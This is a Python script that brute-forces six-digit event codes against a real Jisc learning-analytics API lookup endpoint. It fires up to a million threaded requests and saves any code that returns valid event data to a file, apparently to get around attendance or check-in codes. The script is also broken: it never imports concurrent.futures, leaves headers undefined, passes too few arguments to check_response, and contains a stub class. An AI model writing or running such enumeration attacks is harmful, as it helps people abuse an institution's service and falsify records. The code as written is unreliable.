import requests
import threading

class JiscCodeBreaker:
    def __init__(self, headers, eventId, searchValueLow = 0, searchValueHigh = 999999, threadCount = 10):
        self.eventId = eventId
        self.threadCount = threadCount
        self.headers = headers
        self.searchValueLow = 0
        self.searchValueHigh = searchValueHigh
        self.searchValue = searchValueLow
        self.url = f"https://api.la.jisc.ac.uk/event/lookup/{str(self.searchValue).zfill(6)}?id={eventId}"

    def GetCode():
        pass

def check_response(number, id):
    url = f"https://api.la.jisc.ac.uk/event/lookup/{str(number).zfill(6)}?id={str(id)}"
    try:
        response = requests.get(url, headers=headers)
        print(f"Checking number: {str(number).zfill(6)}")  # Print the number for each request

        if response.status_code == 200 and response.json() != {"error": "Something went wrong"}:
            print(f"Success with number: {number}")
            with open('success.txt', 'a') as f:  # Open the file in append mode
                f.write(f"Success with number: {number}\n")
                f.write(f"{response.json()}\n\n")  # Write the actual response to the file
    except Exception as e:
        print(f"Error with number {number}: {e}")

# Function to handle threading and making multiple requests
def make_requests(start_number=0, end_number=999999, max_workers=30):
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit tasks to the thread pool
        futures = [executor.submit(check_response, number) for number in range(start_number, end_number + 1)]
        
        # Wait for all threads to complete
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()  # This will raise any exceptions encountered
            except Exception as e:
                print(f"Error in thread: {e}")
